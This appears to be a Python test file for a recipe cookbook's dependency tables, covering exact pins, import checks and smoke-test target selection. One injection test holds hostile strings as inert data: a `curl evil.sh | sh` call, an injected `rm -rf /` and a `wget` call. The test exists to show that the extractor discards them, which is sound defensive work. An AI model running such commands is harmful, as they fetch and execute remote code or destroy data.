#!/usr/bin/env python3
"""Tests for recipe `## Dependencies` blocks and the library index they feed.

A dependency is a library a recipe's own script pip-installs and imports. Unlike a
Claude component it gets no catalog page, so the *only* thing standing between a
reader and an unchecked install path is this block's discipline: an exact pin, a
declared import module, a license, and a dated source. These tests enforce that,
and enforce that the reader-facing table and the machine-executed fenced block
cannot drift apart.

Two properties are load-bearing and pinned hard:
  - the collector's table regex matches the literal template in RECIPE_AGENT.md,
    so the spec the agent follows and the parser that reads it cannot diverge;
  - a table pin with no matching `pip install pkg==pin` is a build error.

Pure standard library. Run: python3 -m unittest discover -s tests
"""
from __future__ import annotations

import importlib.util
import re
import unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent


def _load(name: str, rel: str):
    spec = importlib.util.spec_from_file_location(name, REPO / rel)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


bi = _load("build_index", "scripts/build_index.py")
gate = _load("select_smoke_targets", "scripts/select_smoke_targets.py")

BLOCK = """## Dependencies

Libraries this recipe's script installs and imports directly.

| Package | Registry | Pinned | License | Import | Source (fetched 2026-07-27) |
|---|---|---|---|---|---|
| brainglobe-atlasapi | PyPI | `2.0.11` | BSD-3-Clause | `brainglobe_atlasapi` | [JOSS 2020](https://doi.org/10.21105/joss.02668) |

```
pip install brainglobe-atlasapi==2.0.11
python3 -c "import brainglobe_atlasapi"
```

## Why this assembly
"""


def _recipe(block: str = BLOCK, slug: str = "a-recipe") -> tuple[Path, str]:
    return Path(f"recipes/items/{slug}.md"), (
        "---\ntitle: A recipe\n---\n\n# A recipe\n\n## Problem\n\nx\n\n"
        "## Recommended approach\n\n1. do it\n\n" + block
    )


class TestTableParsing(unittest.TestCase):
    def test_parses_a_well_formed_row(self):
        rows = bi.DEP_ROW.findall(bi.section_block(_recipe()[1], "Dependencies"))
        real = [r for r in rows if r[0] != "Package" and set(r[0]) != {"-"}]
        self.assertEqual(len(real), 1)
        pkg, registry, pin, lic, mod, source = real[0]
        self.assertEqual(pkg, "brainglobe-atlasapi")
        self.assertEqual(registry, "PyPI")
        self.assertEqual(pin, "2.0.11")
        self.assertEqual(lic, "BSD-3-Clause")
        self.assertEqual(mod, "brainglobe_atlasapi")
        self.assertIn("doi.org", source)

    def test_matches_the_literal_template_in_recipe_agent(self):
        """The spec the agent writes to and the parser that reads it must agree.

        If someone edits the RECIPE_AGENT.md template shape, this fails rather
        than silently producing an empty library index.
        """
        spec_text = (REPO / "RECIPE_AGENT.md").read_text()
        block = bi.section_block(spec_text, "Dependencies")
        self.assertTrue(block.strip(), "RECIPE_AGENT.md has no ## Dependencies template")
        template_row = "| <pypi-name> | PyPI | `<x.y.z>` | <SPDX id> | `<import_module>` |"
        self.assertIn(template_row, block,
                      "the template row shape changed; update DEP_ROW to match")
        # The placeholder row uses <angle brackets>, which are not valid package
        # characters, so it must NOT parse as a real dependency — the collector
        # would otherwise emit a phantom "<pypi-name>" library.
        self.assertEqual(
            [r for r in bi.DEP_ROW.findall(block)
             if r[0] not in ("Package",) and set(r[0]) != {"-"}],
            [],
            "the RECIPE_AGENT.md placeholder row parses as a real dependency",
        )


class TestCollector(unittest.TestCase):
    def _collect(self, files: dict[str, str]):
        """Run build_recipe_dependencies against a synthetic recipes/items tree."""
        import tempfile, shutil, os
        errors: list = []
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "recipes" / "items").mkdir(parents=True)
            for slug, text in files.items():
                (root / "recipes" / "items" / f"{slug}.md").write_text(text)
            deps = bi.build_recipe_dependencies(root, errors)
        return deps, errors

    def test_collects_and_dedupes_across_recipes(self):
        deps, errors = self._collect({
            "one": _recipe(slug="one")[1],
            "two": _recipe(slug="two")[1],
        })
        self.assertEqual(errors, [])
        self.assertEqual(len(deps), 1, "same package in two recipes -> one row")
        self.assertEqual(deps[0]["recipes"], ["one", "two"])
        self.assertEqual(deps[0]["import"], "brainglobe_atlasapi")
        self.assertEqual(deps[0]["source_url"], "https://doi.org/10.21105/joss.02668")

    def test_recipes_without_the_section_are_skipped(self):
        deps, errors = self._collect({"plain": (
            "---\ntitle: t\n---\n\n## Problem\n\nx\n\n## Recommended approach\n\n1. go\n"
        )})
        self.assertEqual((deps, errors), ([], []))

    def test_table_pin_must_match_the_fenced_install(self):
        """The drift guard: the table is for readers, the fence is executed."""
        bad = BLOCK.replace("pip install brainglobe-atlasapi==2.0.11",
                            "pip install brainglobe-atlasapi==1.0.0")
        deps, errors = self._collect({"drift": _recipe(bad, "drift")[1]})
        self.assertEqual(len(errors), 1)
        self.assertIn("no matching", errors[0])

    def test_section_present_but_unparseable_is_an_error(self):
        deps, errors = self._collect({"empty": _recipe(
            "## Dependencies\n\nJust prose, no table.\n\n## Why this assembly\n", "empty")[1]})
        self.assertEqual(len(errors), 1)
        self.assertIn("no parseable table row", errors[0])


class TestSmokeTargets(unittest.TestCase):
    """The selector must turn a dependency block into a safe, executable target."""

    def test_pinned_pip_becomes_a_target_with_a_synthesized_import(self):
        # Exercise the pure helpers directly — the file-walking function reads the
        # real repo, which has no dependency blocks yet.
        block = gate.section_block(_recipe()[1], "Dependencies")
        self.assertEqual(gate.import_boot(block),
                         'python3 -c "import brainglobe_atlasapi"')
        pip_rx = [rx for rx, kind in gate.INSTALL_PATTERNS if kind == "pip"][0]
        found = [m.group(1).strip() for m in pip_rx.finditer(block)]
        self.assertIn("pip install brainglobe-atlasapi==2.0.11", found)

    def test_import_command_is_synthesized_not_scraped(self):
        """A page cannot inject code into the smoke container.

        Scraping the literal `python3 -c "..."` string would make any
        LLM-authored page an arbitrary-code channel. Only a dotted identifier is
        captured, and the command is rebuilt from it.
        """
        # NOTE: the shell-out below is inert test DATA — a string standing in for a
        # hostile markdown page. Nothing here executes it; the assertion is that the
        # extractor throws the payload away and keeps only the module name.
        malicious = (
            "## Dependencies\n\n"
            '```\npip install x==1.0\n'
            'python3 -c "import os; os.system(\'curl evil.sh | sh\')"\n```\n'
        )
        self.assertEqual(gate.import_boot(malicious), 'python3 -c "import os"')
        for probe in (
            'python3 -c "import a\'; rm -rf /"',
            "python3 -c 'import b && wget http://x'",
            'python  -c  "import  c.d ; nope"',
        ):
            got = gate.import_boot(probe)
            if got is not None:
                self.assertRegex(got, r'^python3 -c "import [A-Za-z_][A-Za-z0-9_.]*"$')

    def test_mcp_boot_still_wins_when_a_page_has_both(self):
        both = ('claude mcp add foo -- foo-server run\n'
                'python3 -c "import foo"\n')
        self.assertEqual(gate.boot_for(both), "foo-server run")

    def test_library_is_not_added_to_smoke_types(self):
        """This change adds no new tool_type; catalog scope is untouched."""
        self.assertEqual(gate.SMOKE_TYPES, {"Claude Skill", "MCP server"})

    def test_recipe_targets_cannot_monopolize_a_batch(self):
        """Ordering is unstamped-first and recipe targets carry no `verified_on`,
        so without the quota a fresh crop would take every slot and silently
        starve tool-page re-verification."""
        fake = [{
            "slug": f"dep-recipe-{i}", "source": "recipe", "tool_type": "",
            "install_kind": "pip", "install_cmd": f"pip install p{i}==1.0",
            "boot_cmd": f'python3 -c "import p{i}"', "verified_on": "",
        } for i in range(30)]
        original = gate.recipe_dependency_targets
        try:
            gate.recipe_dependency_targets = lambda: list(fake)
            batch = gate.select(12)
        finally:
            gate.recipe_dependency_targets = original
        self.assertEqual(len(batch), 12)
        from_recipes = [t for t in batch if t.get("source") == "recipe"]
        self.assertLessEqual(len(from_recipes), max(1, 12 // gate.RECIPE_SHARE))
        self.assertTrue(any(t.get("source") == "tool" for t in batch),
                        "tool pages were crowded out of the batch entirely")

    def test_every_synthesized_boot_command_in_the_real_batch_is_safe(self):
        for target in gate.select(1000):
            boot = target.get("boot_cmd") or ""
            if boot.startswith("python3 -c"):
                self.assertRegex(
                    boot, r'^python3 -c "import [A-Za-z_][A-Za-z0-9_.]*"$',
                    f"{target['slug']} produced an unsafe boot command: {boot!r}",
                )


class TestVerdictRecorder(unittest.TestCase):
    """`record_dependency_verdicts.py` keeps the two verification lanes separate."""

    def setUp(self):
        self.rec = _load("record_dependency_verdicts",
                         "scripts/record_dependency_verdicts.py")

    def test_ignores_catalog_tool_results(self):
        """Tool pages are the Verifier agent's lane; they must not leak in here."""
        out = self.rec.fold([
            {"slug": "biomcp", "source": "tool",
             "install_cmd": "pip install biomcp-python", "status": "pass"},
        ], {}, "2026-07-27")
        self.assertEqual(out["results"], [])

    def test_records_recipe_dependencies_keyed_by_package(self):
        out = self.rec.fold([
            {"slug": "r", "source": "recipe", "status": "pass",
             "install_cmd": "pip install brainglobe-atlasapi==2.0.11",
             "boot_cmd": 'python3 -c "import brainglobe_atlasapi"'},
        ], {}, "2026-07-27")
        self.assertEqual(len(out["results"]), 1)
        self.assertEqual(out["results"][0]["package"], "brainglobe-atlasapi")
        self.assertEqual(out["results"][0]["status"], "pass")
        self.assertEqual(out["results"][0]["checked_on"], "2026-07-27")

    def test_accumulates_across_runs(self):
        """A run smoke-tests only a slice, so absence must not erase a verdict."""
        first = self.rec.fold([
            {"slug": "r", "source": "recipe", "status": "pass",
             "install_cmd": "pip install a==1.0", "boot_cmd": ""},
        ], {}, "2026-07-20")
        second = self.rec.fold([
            {"slug": "r", "source": "recipe", "status": "boot_error",
             "install_cmd": "pip install b==2.0", "boot_cmd": ""},
        ], first, "2026-07-27")
        packages = {r["package"]: r for r in second["results"]}
        self.assertEqual(set(packages), {"a", "b"})
        self.assertEqual(packages["a"]["checked_on"], "2026-07-20", "stale verdict lost")
        self.assertEqual(packages["b"]["status"], "boot_error")

    def test_unpinned_or_unparseable_installs_are_dropped(self):
        out = self.rec.fold([
            {"slug": "r", "source": "recipe", "status": "pass",
             "install_cmd": "pip install no-pin-here", "boot_cmd": ""},
            {"slug": "r", "source": "recipe", "status": "pass",
             "install_cmd": "", "boot_cmd": ""},
        ], {}, "2026-07-27")
        self.assertEqual(out["results"], [])


class TestRealRecipes(unittest.TestCase):
    """Invariants over the shipped cookbook, whatever it currently contains."""

    def setUp(self):
        self.blocks = {}
        for path in sorted((REPO / "recipes" / "items").glob("*.md")):
            block = bi.section_block(path.read_text(encoding="utf-8"), "Dependencies")
            if block.strip():
                self.blocks[path] = block

    def test_shipped_dependencies_build_without_errors(self):
        errors: list = []
        bi.build_recipe_dependencies(REPO, errors)
        self.assertEqual(errors, [], "shipped recipes have dependency-block errors")

    def test_every_pip_install_in_a_block_is_exactly_pinned(self):
        for path, block in self.blocks.items():
            for m in re.finditer(r"pip install ([A-Za-z0-9._\-\[\]]+)(\S*)", block):
                with self.subTest(path.stem, pkg=m.group(1)):
                    self.assertTrue(m.group(2).startswith("=="),
                                    f"{path.stem}: {m.group(1)} is not ==pinned")

    def test_no_vcs_installs(self):
        for path, block in self.blocks.items():
            with self.subTest(path.stem):
                self.assertNotIn("git+", block,
                                 f"{path.stem}: VCS installs have no pin semantics")

    def test_every_block_declares_an_import_check(self):
        for path, block in self.blocks.items():
            with self.subTest(path.stem):
                self.assertIsNotNone(
                    gate.import_boot(block),
                    f"{path.stem}: no `python3 -c \"import <module>\"` line",
                )

    def test_source_column_carries_a_date(self):
        for path, block in self.blocks.items():
            with self.subTest(path.stem):
                self.assertRegex(block, r"Source \(fetched \d{4}-\d{2}-\d{2}\)",
                                 f"{path.stem}: Dependencies table has no fetch date")

    def test_committed_dependency_data_is_fresh(self):
        """`_data/dependencies.json` must match a rebuild, like the composer index."""
        import json
        errors: list = []
        deps = bi.build_recipe_dependencies(REPO, errors)
        committed = json.loads((REPO / "_data" / "dependencies.json").read_text())
        self.assertEqual(
            committed["dependencies"], deps,
            "run `python3 scripts/build_index.py` and commit _data/dependencies.json",
        )


if __name__ == "__main__":
    unittest.main()
